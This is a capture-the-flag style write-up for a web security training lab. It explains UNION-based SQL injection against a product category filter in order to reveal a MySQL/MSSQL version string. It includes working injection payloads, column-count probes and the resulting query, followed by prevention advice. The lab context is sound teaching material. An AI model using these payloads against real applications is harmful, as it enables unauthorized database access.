SQL Injection: Querying Database Version (MySQL / Microsoft SQL Server)

Category: SQL Injection
Difficulty: Practitioner
Lab Link: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft

---

Vulnerability

The product category filter is vulnerable to SQL injection.
User input is directly inserted into a SQL query, allowing attackers to perform UNION-based SQL injection and retrieve additional information from the database.

The goal of this lab is to display the database version string.

---

Payload

' UNION SELECT @@version, NULL#

---

Exploitation Steps

1. Navigate to a product category.
2. Observe the request parameter:

/filter?category=Gifts

3. Determine the number of columns returned by the query:

' ORDER BY 1--
' ORDER BY 2--

The query returns 2 columns.

4. Perform a UNION-based SQL injection to retrieve the database version:

' UNION SELECT @@version, NULL#

5. The database version string is displayed in the application response, solving the lab.

---

Why the Attack Works

The original query likely resembles:

SELECT name, description FROM products WHERE category='Gifts'

The injected query becomes:

SELECT name, description FROM products WHERE category='Gifts'
UNION SELECT @@version, NULL# 

NOTE - use %23 if # is not encoded to %23 in browser

SELECT name, description FROM products WHERE category='Gifts'
UNION SELECT @@version, NULL%23

Explanation:

- "UNION" combines results from two queries.
- "@@version" returns the database version in MySQL and Microsoft SQL Server.
- The result is displayed in the application's response.

---

Prevention

- Use parameterized queries / prepared statements
- Validate user input
- Avoid directly concatenating user input into SQL queries
